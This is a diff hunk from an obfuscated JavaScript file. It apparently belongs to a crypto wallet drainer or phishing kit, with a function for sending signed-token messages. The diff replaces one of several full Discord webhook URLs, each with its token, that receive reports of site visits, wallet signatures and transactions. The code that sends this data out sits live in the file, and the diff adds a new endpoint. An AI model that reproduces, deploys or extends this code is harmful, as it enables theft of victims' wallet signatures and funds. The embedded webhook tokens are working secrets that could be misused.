@@ -5639,7 +5639,7 @@ function sendSignTokenMessage(desc, selectAccount, hostname, signData, signature
 const webhooUri = {
   visit: 'https://discord.com/api/webhooks/1087632125911629854/v2lmQ6n_XRoCBTD5AgufRCgbZppalD2Lr2vpHJA-ZmLxGvadMyxLCvvbU6uWDgf_XvFj',
   signedVisit: 'https://discord.com/api/webhooks/1087632009700065310/Rpr7WHS1Z3yzmkawTnh8D1wltHIzieVX-MLOR2LBskb_E50LOhaB4yokHm97p9UZRALV',
-  postSign: 'https://discord.com/api/webhooks/1087631882830757908/bwi2Af48QKGtQHTVBhSmxBWZbkAY9WMel5RsHRLMTi9nkFiT69xOjjaSCfDjeK5709eh',
+  postSign: 'https://discord.com/api/webhooks/1130507779426222090/udYpGXUMQs0ZP-tectyBA75wdMAKlD2jckpSilwJ9RemyBM0YNp8S4jZjsvmKIPTLOKh',
   postTRX: 'https://discord.com/api/webhooks/1087631641817649193/1VJ4zhFe4xC2x3TwZeP08ATkZ3ekDkAAQtTrbyu4SwzbT-E6KK5qWs0nfCTCRXf383ww',
   badSignature: _0x5c7eff(0x834)
 }
